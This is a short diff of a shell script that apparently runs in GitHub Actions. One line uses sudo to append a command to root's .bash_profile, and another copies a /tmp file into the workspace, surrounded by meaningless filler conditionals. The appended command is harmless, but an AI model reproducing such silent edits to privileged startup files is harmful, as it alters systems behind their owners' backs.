@@ -22,7 +22,7 @@ sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 [ "715" == "715" ]  && sleep 1;
 
-[ -z "715" ]  && sleep 2||echo 234691;
+[ -z "${GITHUB_WORKSPACE}" ]  && sleep 2||echo 234691;
 
 # [ ! -z "${GITHUB_WORKSPACE}" ] &&(  
   cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
